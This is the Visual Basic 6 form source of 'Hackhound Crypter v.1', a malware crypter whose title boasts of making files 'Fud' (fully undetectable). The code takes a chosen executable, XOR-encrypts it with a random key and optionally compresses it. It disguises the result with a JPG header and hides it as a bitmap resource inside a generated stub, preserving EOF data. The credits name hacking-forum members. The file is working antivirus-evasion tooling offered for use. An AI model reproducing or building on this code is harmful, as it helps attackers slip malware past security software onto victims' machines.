VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "Comdlg32.ocx"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fest Einfach
   Caption         =   "Hackhound Crypter v.1 To make the world more Fud"
   ClientHeight    =   3225
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   5985
   BeginProperty Font 
      Name            =   "Verdana"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3225
   ScaleWidth      =   5985
   StartUpPosition =   3  'Windows-Standard
   Begin VB.Frame Frame 
      Height          =   1935
      Left            =   120
      TabIndex        =   0
      Top             =   1200
      Width           =   5775
      Begin VB.CheckBox CheckEof 
         Caption         =   "Eof Support"
         Height          =   255
         Left            =   3360
         TabIndex        =   11
         Top             =   1080
         Width           =   1335
      End
      Begin VB.CommandButton Commandh 
         Caption         =   "..."
         Height          =   285
         Index           =   2
         Left            =   5160
         TabIndex        =   10
         Top             =   720
         Width           =   495
      End
      Begin VB.CommandButton Command 
         Caption         =   "About"
         Height          =   375
         Index           =   1
         Left            =   3960
         TabIndex        =   9
         Top             =   1440
         Width           =   1695
      End
      Begin VB.CheckBox Check1 
         Caption         =   "Use Native Compression"
         Height          =   255
         Left            =   720
         TabIndex        =   8
         Top             =   1080
         Width           =   2415
      End
      Begin VB.TextBox RndEnKeytxt 
         Appearance      =   0  '2D
         Height          =   285
         Left            =   720
         TabIndex        =   6
         Top             =   720
         Width           =   4335
      End
      Begin VB.CommandButton Commanda 
         Caption         =   "Stub Gen"
         Height          =   375
         Index           =   0
         Left            =   120
         TabIndex        =   5
         Top             =   1440
         Width           =   1695
      End
      Begin VB.TextBox abc 
         Appearance      =   0  '2D
         Height          =   285
         Left            =   720
         TabIndex        =   3
         Text            =   "File..."
         Top             =   240
         Width           =   4335
      End
      Begin VB.CommandButton Command1 
         Caption         =   "Crypt"
         Height          =   375
         Left            =   2040
         TabIndex        =   2
         Top             =   1440
         Width           =   1695
      End
      Begin VB.CommandButton Command2 
         Caption         =   "..."
         Height          =   285
         Left            =   5160
         TabIndex        =   1
         Top             =   240
         Width           =   495
      End
      Begin VB.Label Label 
         AutoSize        =   -1  'True
         Caption         =   "Key:"
         Height          =   195
         Index           =   1
         Left            =   120
         TabIndex        =   7
         Top             =   720
         Width           =   405
      End
      Begin VB.Label Label 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "File:"
         Height          =   195
         Index           =   0
         Left            =   120
         TabIndex        =   4
         Top             =   240
         Width           =   360
      End
   End
   Begin MSComDlg.CommonDialog wow 
      Left            =   5040
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Image Image 
      Height          =   1200
      Left            =   0
      Picture         =   "Form1.frx":0000
      Top             =   0
      Width           =   6000
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Const RT_BITMAP As Long = &H2

Private Sub Command_Click(Index As Integer)
MsgBox "Coder: f0rce" & vbNewLine & "Private for [Username]" & vbNewLine & "Credits: Abronsius, Karcrack and SqUeEzEr!" & vbNewLine & "Greetz to the greatest Community Hackhound.org!", vbInformation, "About"
End Sub

Private Sub Commandh_Click(Index As Integer)
RndEnKeytxt.Text = EnRndKey
End Sub

Private Sub Command2_Click()
wow.ShowOpen
wow.Filter = "Executable Files (*.exe) | *.exe"
abc.Text = wow.FileName
End Sub

Private Sub Command1_Click()
Dim xd As String
Dim sxd As String
Dim ef As String
Dim bfile() As Byte
Dim EofLen As String

If FileExists(App.Path + "\" + "LFile.exe") = False Then
MsgBox "Generate a Stub!", vbInformation, "Info"
Exit Sub
End If

wow.ShowSave
wow.Filter = "Executable Files (*.exe) | *.exe"

Open abc.Text For Binary As #1
xd = Space$(LOF(1))
Get #1, , xd
Close #1

Open App.Path & "\LFile.exe" For Binary As #1
sxd = Space$(LOF(1))
Get #1, , sxd
Close #1

If CheckEof.Value = 1 Then
EofLen = GetEOFData(abc.Text)
End If

Call FileCopy(App.Path & "\LFile.exe", wow.FileName)

ef = XOREncryption(xd, RndEnKeytxt.Text)

bfile() = StrConv(ef, vbFromUnicode)

If Check1.Value = 1 Then
bfile() = Compress(bfile())
End If

Call SetResourceBytes(RT_BITMAP, 1000, AddJpgHeader(bfile()), wow.FileName)

If CheckEof.Value = 1 Then
Call WriteEOFData(wow.FileName, EofLen)
End If

MsgBox "Finish!" & vbNewLine & "Final Size: " & FileLen(wow.FileName) & " Bytes", vbInformation, "Info"
End Sub

Private Sub Commanda_Click(Index As Integer)
Form2.Show
End Sub


Private Sub Form_Load()
Call InitializeEngine
Commandh_Click (2)
End Sub
Public Function XOREncryption(DataIn As String, CodeKey As String) As String
    
    Dim lonDataPtr As Long
    Dim strDataOut As String
    Dim Temp As Integer
    Dim tempstring As String
    Dim intXOrValue1 As Integer
    Dim intXOrValue2 As Integer
    

    For lonDataPtr = 1 To Len(DataIn)
        
        intXOrValue1 = Asc(Mid$(DataIn, lonDataPtr, 1))
        
        intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
        
        Temp = intXOrValue1 Xor intXOrValue2
        tempstring = Hex(Temp)
        If Len(tempstring) = 1 Then tempstring = "0" & tempstring
        
        strDataOut = strDataOut + tempstring
    Next lonDataPtr
   XOREncryption = strDataOut
End Function
